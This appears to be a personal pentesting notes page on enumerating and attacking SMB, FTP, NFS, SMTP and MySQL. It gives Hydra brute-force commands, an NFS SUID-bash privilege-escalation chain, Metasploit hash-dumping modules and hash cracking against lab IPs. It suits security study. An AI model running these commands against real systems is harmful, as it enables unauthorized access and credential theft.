<h1> Ports and Services </h1>

[Home](index.html)

[toc]

#### SMB (139,445/tcp)

[Top](ports.html)

Server Message Block Protocol- client-server communication protocol used for sharing access across the network.

Known as a response-request protocol. Clients connect to servers using TCP/IP, NetBios, NetBEUI, or IPX/SPX

**What runs SMB** 

Microsoft Windows operating systems since Windows 95

Samba - supports SMB protocol for Unix

**Enumeration**

Typically there are share drives on a server that can be connected to

IPC$ share - anonymous null session can access IPC$

**Port Scan**

139 - NBT over IP

445 - SMB over IP

```
nmap --script "safe or smb-enum-*" -p 445 <IP>
```

**Example**

```
enum4linux -a <-u "username" -p "password"> <IP>
```

Username and password not required

**Exploitation**

Common exploit -  [CVE-2017-7494](https://www.cvedetails.com/cve/CVE-2017-7494/) 

The best way into a system is misconfiguration like anonymous login

Always use searchsploit on possible vulnerabilities

**SMBClient**

Client to access resources on servers

```
smbclient //<IP>/<Share> -U <user> -p <port> 445 default port
```

Can use `\\\`

This will prompt you for a password unless you are anonymous login

```
smb: \> help
```

---





#### FTP (21/tcp,20)

[Top](ports.html)

File Transfer Protocol

Used to allow remote transfer of files over the network

Client-server model

**How does it work?**

2 Channels/modes - a command (control) - Port 21

​       							  a data channel - Port 20

Supports Active and Passive Connections

Active - client opens a port and listens, server is required to actively connect to it

Passive - the server opens a port and listens and the client connects to it

**Enumeration**

Always check for anonymous login and make sure a ftp client is on your attack box "ftp>"

`in.ftpd` and other ftp server variants respond different to the  `cwd` command and is worth knowing  https://www.exploit-db.com/exploits/20745 

```
nmap –script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 <IP>
```

Don’t forget to check udp ports : -sU

 Banner Grab with telnet

```
telnet -vn <IP> 21
```

 Check Anonymous login

```
ftp <IP> 
```

Enter anonymous:: <No password>

```
ftp> help
 
Look for location you can upload shells
To Upload / copy file from one location to another
Telnet <IP> 21
site cpfr <directory1>
site cpto <directory2>
 
```

**Exploiting FTP**

Command and data channels are unencrypted

Effective man-in-the-middle attacks  [JSCape](https://www.jscape.com/blog/bid/91906/Countering-Packet-Sniffers-Using-Encrypted-FTP)

Weak or Default passwords

**BruteForce**

Hydra

```
hydra -t 4 -l <username> -P <Wordlist> -vV <IP> ftp
```

---





#### NFS (111/2049/tcp)

[Top](ports.html)

Allows systems to share directories and files with other over the network

Does this by mounting files on the server

https://docs.oracle.com/cd/E19683-01/816-4882/6mb2ipq7l/index.html

 The client will request to mount a directory from a remote host on a local directory then act to connect to relevant mount using RCP

 Access - if someone wants to access a file using NFS, an RPC call is placed to NFSD (nfs daemon)

Permission - 

- The file  handle
- The  name of the file to be accessed
- The  user's, user ID
- The  user's group ID

 **Enumeration**

Tool - 

nsf-common - allows you to interact with NFS shares. Locked, statd, showmount, nfstat, gssd, idmapd, and mount.nfs

```
nmap --script "nsf-ls,nfs-showmount,nfs-statfs -p 111,2049 <IP>  ----------------->
Metasploit - scanner/nfs/mfsmount
 
showmount -e <IP> 
```

Mount -

Make a directory for your mount - mkdir /tmp/mount

```
mount -t nfs [-o vers=2] <ip>:<remote_folder> <local_folder> -o nolock 
                     ^^ not needed
Now you can cd into your newly made mount
```

**Exploit/Privilege escalation**

root_squash - enabled by default, it prevents anyone connecting to the NFS share from having root

Remote users are assigned "nfsnobody"

 SUID - means that files can be run with permissions of the owner/group

 Upload files to the NFS share - with right permission (reverse shell)

```
	NFS Access ->
	        Gain Low Privilege Shell -> 
			Any files important for ssh like .ssh keys ?
	            Upload Bash Executable to the NFS share ->
			Cd into the mount and upload the executable bash
	                Set SUID Permissions Through NFS Due To Misconfigured Root Squash ->
			chmod +srx bash
	                    Login through SSH ->
	                        Execute SUID Bit Bash Executable ->
				./bash -p (-p persists permissions)
                            ROOT ACCESS
```

---





#### SMTP (25/tcp)

[Top](ports.html)

**Simple Mail Transfer Protocol**

Utilizes to handle the sending of emails. A protocol pair is required, comprising of SMTP and POP/IMAP

​	Verifies who is sending emails through the SMTP server

​	Sends outgoing mail

​	If outgoing mail cant be delivered it sends the message back to the sender

When setting up an email on third-party email clients, like thunderbird, you will also have to configure the SMTP server

 	Email protocols that transfer of email between client and mail server

​			**POP** - Post Office Protocol - downloads the inbox from the mail server to the client

​			**IMAP **- Internet Message Access Protocol - synchronizes the current inbox with new mail on the server downloading anything new, changes persist 			with another computer

**How it Works?** 

https://computer.howstuffworks.com/e-mail-messaging/email3.htm

![smtp_works](\\DESKTOP-V4G5U0G\Users\EDuty\Documents\Notes\smtp_work.png) 

**Enumeration**

Metasploit - `smtp_version` (auxiliary/scanner/smtp/smtp_version)

​		`set rhosts`

​	Two internal commands that allow user enumeration: VRFY and EXPN
​	Use these commands over telnet or metasploit smtp_enum (auxiliary/scanner/smtp/smtp_enum)
​	Set user_file for wordlist of users

`nc -vn <IP> 25`
`nmap -p 25 --script smtp* <IP>`

`smtp-user-enum`

Mail Transfer Agent (MTA) - example - Postfix

Seclists - amazing collection of wordlists - sudo apt install -y seclists

​	`git clone https://github.com/danielmiessler/SecLists.git`

**Exploitation**

Now that we got usernames - try bruteforcing ssh (22) 

```
hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.31.173 ssh
       ^^number of parallel connections per target
```

---





#### SQL (3306/tcp)

[Top](ports.html)

SQL - MySQL, PostgreSQL, Microsoft SQL

Relational database management system (RDBMS) based on Structured Query Language

RDBMS - software or service used to create and manage databases based on a table model

MySQL - client-server model, just uses the Structured Query Language

 

The server handles all database instructions like creating, editing, and accessing data

1. MySQL creates a database for     storing and manipulation data
2. Client makes request by     making specific SQL statements
3. Server respond to client with     whatever info that has been requested

 

Back end database for many websites and forms, the essential component of LAMP Stack

**Enumeration**

MySQL is typically not going to be the first point of initial entry

Usually you will find initial creds from enumerating other services

```
Metasploit - auxillary/admin/mysql/mysql_sql
Set rhosts and you can set SQL to select version , show databases
```

```
nmap --script mysql-enum <IP> -p 3306
```

 Manually connect to mysql using found creds

```
mysql -h <IP> -u <username> -p
```

**Exploitation**

Using MSSQLCLIENT (if you have creds)

locate mssqlclient

cd to the directory 

 	`cd /home/kali/impacket/examples/` 

`python3 mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth`

​												^Username @ HostIP 

​	Sign in with password

  

Schema is synonymous with database

Hashes - algorithm assign a unique ID

 Metasploit - auxiliary/scanner/mysql/mysql_schemadump

```
Set password

Set username

Set rhosts

auxiliary/scanner/mysql/mysql_hashdump

Set password

Set username

Set rhosts
```

Use John to try and crack hash 

```
john <file with full hash>
	carl:*EA031893AA21444B170FC2162A56978B8CEECE18
```

